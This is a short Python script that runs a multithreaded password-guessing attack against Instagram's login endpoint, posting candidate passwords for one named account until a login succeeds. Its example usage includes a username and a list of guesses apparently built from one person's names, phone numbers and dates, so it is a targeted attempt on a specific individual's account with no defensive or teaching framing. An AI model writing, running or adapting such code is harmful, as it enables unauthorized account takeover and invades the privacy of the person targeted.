import itertools
import requests
import threading

def crack_password(username, password_list, num_threads):
    chunk_size = len(password_list) // num_threads
    threads = []
    for i in range(num_threads):
        start = i * chunk_size
        end = start + chunk_size
        if i == num_threads - 1:
            end = len(password_list)
        thread = threading.Thread(target=crack_password_chunk, args=(username, password_list[start:end]))
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()

def crack_password_chunk(username, password_list):
    session = requests.Session()
    for password in password_list:
        response = session.post('https://www.instagram.com/accounts/login', data={'username':username, 'password':password})
        if 'authenticated":true' in response.text:
            print('Password found:', password)
            return
    print('Password not found')

# example usage
password_list = ['lhongyhag2492001','bas0628914419','0830652118','aunyawee0628914419','Aunyawee249','0628914419','lhongyhag083','piyaakkharapat0628914419','Sebastian0628914419','piyaakkharapat249']
crack_password('fuckoffcyka', password_list, 10)
